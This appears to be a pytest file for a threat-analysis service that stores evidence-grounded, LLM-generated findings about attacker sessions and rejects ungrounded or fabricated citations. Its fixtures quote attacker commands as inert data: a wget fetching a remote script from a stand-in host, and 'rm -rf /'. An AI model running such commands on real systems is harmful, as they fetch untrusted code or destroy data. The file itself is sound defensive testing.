import uuid
from datetime import datetime, timezone

import pytest
from sqlalchemy import select
from sqlalchemy.exc import IntegrityError

from app.db.models import (
    Analysis,
    EvidenceRef,
    ObservedBehavior,
    ParentType,
    RecommendedAction,
    SuspiciousIndicator,
    TechniqueMapping,
)
from app.db.session import get_session_factory
from app.services.llm.schemas import EvidenceCitation
from app.services.persistence import Claim, load_evidence, persist_analysis

NOW = datetime(2026, 8, 20, 10, 0, 30, tzinfo=timezone.utc)
TIMESTAMPS = {"e-wget": NOW, "e-uname": NOW}


def _analysis(session_id: str = "seed-botnet-01") -> Analysis:
    return Analysis(
        id=uuid.uuid4(),
        session_id=session_id,
        model="llama3.1:8b",
        analysis_type="session_behavior",
        status="completed",
        created_at=NOW,
        duration_seconds=9,
        classification="Automated botnet dropper",
        confidence=0.91,
        risk_score=87,
        risk="critical",
        behavior_summary="Downloaded and executed a remote script.",
        model_tier="local",
        prompt_version="v1",
    )


def _grounded_claim() -> Claim:
    return Claim(
        kind=ParentType.TECHNIQUE_MAPPING,
        payload={
            "technique_id": "T1105",
            "technique_name": "Ingress Tool Transfer",
            "tactic": "Command and Control",
            "confidence": 1.0,
            "ai_explanation": None,
            "source": "rule",
            "rule_id": "T1105",
            "timestamp": NOW,
        },
        evidence=[EvidenceCitation(event_id="e-wget", artifact="wget http://x/y.sh")],
    )


async def load_evidence_rows(db, parent_id: uuid.UUID) -> list[EvidenceRef]:
    return (
        (await db.execute(select(EvidenceRef).where(EvidenceRef.parent_id == parent_id)))
        .scalars()
        .all()
    )


async def _cleanup(analysis_id: uuid.UUID) -> None:
    factory = get_session_factory()
    async with factory() as db:
        for model in (TechniqueMapping, ObservedBehavior, SuspiciousIndicator):
            rows = (
                (await db.execute(select(model).where(model.analysis_id == analysis_id)))
                .scalars()
                .all()
            )
            for row in rows:
                for ref in await load_evidence_rows(db, row.id):
                    await db.delete(ref)
                await db.delete(row)
        actions = (
            (
                await db.execute(
                    select(RecommendedAction).where(
                        RecommendedAction.analysis_id == analysis_id
                    )
                )
            )
            .scalars()
            .all()
        )
        for action in actions:
            await db.delete(action)
        analysis = await db.get(Analysis, analysis_id)
        if analysis:
            await db.delete(analysis)
        await db.commit()


@pytest.mark.asyncio
async def test_grounded_claim_is_persisted_with_its_evidence() -> None:
    analysis = _analysis()
    rejected = await persist_analysis(
        analysis, [_grounded_claim()], [], "seed-botnet-01", TIMESTAMPS
    )
    assert rejected == 0

    factory = get_session_factory()
    async with factory() as db:
        mapping = (
            (
                await db.execute(
                    select(TechniqueMapping).where(
                        TechniqueMapping.analysis_id == analysis.id
                    )
                )
            )
            .scalars()
            .one()
        )
        refs = await load_evidence_rows(db, mapping.id)

    assert mapping.technique_id == "T1105"
    assert [r.es_event_id for r in refs] == ["e-wget"]
    await _cleanup(analysis.id)


@pytest.mark.asyncio
async def test_ungrounded_claim_is_rejected_and_counted() -> None:
    """Proves refusal path 1: a claim with an EMPTY evidence list.

    Removing the `if not grounded: ... continue` guard in persist_analysis
    would insert this row and make `behaviors == []` fail, and `rejected`
    would come back 0 instead of 1 -- confirmed by temporarily deleting that
    guard locally and re-running this test, which then fails on both
    assertions.
    """
    analysis = _analysis()
    ungrounded = Claim(
        kind=ParentType.OBSERVED_BEHAVIOR,
        payload={"label": "Attacker seemed sophisticated"},
        evidence=[],
    )

    rejected = await persist_analysis(
        analysis, [_grounded_claim(), ungrounded], [], "seed-botnet-01", TIMESTAMPS
    )
    assert rejected == 1

    factory = get_session_factory()
    async with factory() as db:
        behaviors = (
            (
                await db.execute(
                    select(ObservedBehavior).where(
                        ObservedBehavior.analysis_id == analysis.id
                    )
                )
            )
            .scalars()
            .all()
        )
    assert behaviors == []
    await _cleanup(analysis.id)


@pytest.mark.asyncio
async def test_rejected_count_is_recorded_on_the_analysis() -> None:
    """Proves refusal path 4: rejected_claims = prior_rejected + this call's count."""
    analysis = _analysis()
    ungrounded = Claim(
        kind=ParentType.OBSERVED_BEHAVIOR, payload={"label": "vibes"}, evidence=[]
    )

    await persist_analysis(
        analysis, [ungrounded], [], "seed-botnet-01", TIMESTAMPS, prior_rejected=2
    )

    factory = get_session_factory()
    async with factory() as db:
        stored = await db.get(Analysis, analysis.id)
        assert stored is not None
        assert stored.rejected_claims == 3
    await _cleanup(analysis.id)


@pytest.mark.asyncio
async def test_citation_of_an_unknown_event_is_rejected() -> None:
    """Proves refusal path 2: a citation naming an event id not in event_timestamps.

    Removing the `c.event_id in event_timestamps` filter (replacing it with
    "keep every citation") would insert this mapping and drive `rejected`
    back to 0 -- confirmed by that local edit, which flips both assertions
    below.
    """
    analysis = _analysis()
    fabricated = Claim(
        kind=ParentType.TECHNIQUE_MAPPING,
        payload={
            "technique_id": "T1082",
            "technique_name": "System Information Discovery",
            "tactic": "Discovery",
            "confidence": 0.8,
            "ai_explanation": "ran uname",
            "source": "llm",
            "rule_id": None,
            "timestamp": NOW,
        },
        evidence=[EvidenceCitation(event_id="e-not-real", artifact="uname -a")],
    )

    rejected = await persist_analysis(
        analysis, [fabricated], [], "seed-botnet-01", TIMESTAMPS
    )
    assert rejected == 1

    factory = get_session_factory()
    async with factory() as db:
        mappings = (
            (
                await db.execute(
                    select(TechniqueMapping).where(
                        TechniqueMapping.analysis_id == analysis.id
                    )
                )
            )
            .scalars()
            .all()
        )
    assert mappings == []
    await _cleanup(analysis.id)


@pytest.mark.asyncio
async def test_mixed_valid_and_invalid_citations_keeps_only_grounded() -> None:
    """Proves refusal path 3: a claim citing one real event and one fabricated
    one is WRITTEN (not rejected -- it has at least one grounding citation),
    but only the real citation's evidence row survives. Removing the
    per-citation filter (`for citation in grounded`, replaced with
    `for citation in claim.evidence`) would write a second evidence row for
    "e-fabricated", failing the final assertion.
    """
    analysis = _analysis()
    claim = Claim(
        kind=ParentType.TECHNIQUE_MAPPING,
        payload={
            "technique_id": "T1105",
            "technique_name": "Ingress Tool Transfer",
            "tactic": "Command and Control",
            "confidence": 0.95,
            "ai_explanation": None,
            "source": "llm",
            "rule_id": None,
            "timestamp": NOW,
        },
        evidence=[
            EvidenceCitation(event_id="e-wget", artifact="wget http://x/y.sh"),
            EvidenceCitation(event_id="e-fabricated", artifact="rm -rf /"),
        ],
    )

    rejected = await persist_analysis(analysis, [claim], [], "seed-botnet-01", TIMESTAMPS)
    assert rejected == 0

    factory = get_session_factory()
    async with factory() as db:
        mapping = (
            (
                await db.execute(
                    select(TechniqueMapping).where(
                        TechniqueMapping.analysis_id == analysis.id
                    )
                )
            )
            .scalars()
            .one()
        )
        refs = await load_evidence_rows(db, mapping.id)

    assert [r.es_event_id for r in refs] == ["e-wget"]
    await _cleanup(analysis.id)


@pytest.mark.asyncio
async def test_recommended_actions_persist_without_evidence() -> None:
    """Proves the deliberate exemption: RecommendedAction rows have no
    evidence field at all and are written unconditionally, never counted as
    rejected.
    """
    analysis = _analysis()
    action = {
        "priority": "P1",
        "action": "Block source IP at the perimeter",
        "rationale": "Active C2 beacon observed",
    }

    rejected = await persist_analysis(analysis, [], [action], "seed-botnet-01", TIMESTAMPS)
    assert rejected == 0

    factory = get_session_factory()
    async with factory() as db:
        rows = (
            (
                await db.execute(
                    select(RecommendedAction).where(
                        RecommendedAction.analysis_id == analysis.id
                    )
                )
            )
            .scalars()
            .all()
        )
    assert len(rows) == 1
    assert rows[0].action == "Block source IP at the perimeter"
    await _cleanup(analysis.id)


@pytest.mark.asyncio
async def test_transaction_is_atomic_on_partial_failure() -> None:
    """Proves point 6: evidence and its parent claim are written in ONE
    transaction. The polymorphic evidence_refs.parent_id has no foreign key
    (see app/db/models.py), so this atomicity is the only thing standing
    between a valid schema and an orphaned evidence row.

    The second claim reuses the first claim's primary key, forcing a
    real IntegrityError from Postgres mid-loop, after the first claim's
    TechniqueMapping row and its EvidenceRef have already been flushed
    (sent to the DB on this connection, but not committed). If
    persist_analysis committed each claim independently instead of sharing
    one transaction, the first claim's row and evidence would survive this
    failure. They must not.
    """
    analysis = _analysis()
    dup_id = uuid.uuid4()

    first = Claim(
        kind=ParentType.TECHNIQUE_MAPPING,
        payload={
            "id": dup_id,
            "technique_id": "T1105",
            "technique_name": "Ingress Tool Transfer",
            "tactic": "Command and Control",
            "confidence": 1.0,
            "ai_explanation": None,
            "source": "rule",
            "rule_id": "T1105",
            "timestamp": NOW,
        },
        evidence=[EvidenceCitation(event_id="e-wget", artifact="wget http://x/y.sh")],
    )
    colliding = Claim(
        kind=ParentType.TECHNIQUE_MAPPING,
        payload={
            "id": dup_id,  # same primary key -> IntegrityError on flush
            "technique_id": "T1082",
            "technique_name": "System Information Discovery",
            "tactic": "Discovery",
            "confidence": 0.9,
            "ai_explanation": None,
            "source": "rule",
            "rule_id": "T1082",
            "timestamp": NOW,
        },
        evidence=[EvidenceCitation(event_id="e-uname", artifact="uname -a")],
    )

    with pytest.raises(IntegrityError):
        await persist_analysis(
            analysis, [first, colliding], [], "seed-botnet-01", TIMESTAMPS
        )

    factory = get_session_factory()
    async with factory() as db:
        stored_analysis = await db.get(Analysis, analysis.id)
        assert stored_analysis is None, "analysis must not survive a failed transaction"

        mappings = (
            (await db.execute(select(TechniqueMapping).where(TechniqueMapping.id == dup_id)))
            .scalars()
            .all()
        )
        assert mappings == [], "no claim row may survive a failed transaction"

        refs = await load_evidence_rows(db, dup_id)
        assert refs == [], "no evidence row may survive a failed transaction"

    # Defensive: if the guarantee above ever regresses, don't let the leak
    # break every other test's exact-count assertions.
    await _cleanup(analysis.id)


@pytest.mark.asyncio
async def test_load_evidence_returns_refs_for_a_parent() -> None:
    analysis = _analysis()
    await persist_analysis(analysis, [_grounded_claim()], [], "seed-botnet-01", TIMESTAMPS)

    factory = get_session_factory()
    async with factory() as db:
        mapping = (
            (
                await db.execute(
                    select(TechniqueMapping).where(
                        TechniqueMapping.analysis_id == analysis.id
                    )
                )
            )
            .scalars()
            .one()
        )

    refs = await load_evidence(ParentType.TECHNIQUE_MAPPING, mapping.id)
    assert [r.es_event_id for r in refs] == ["e-wget"]
    await _cleanup(analysis.id)
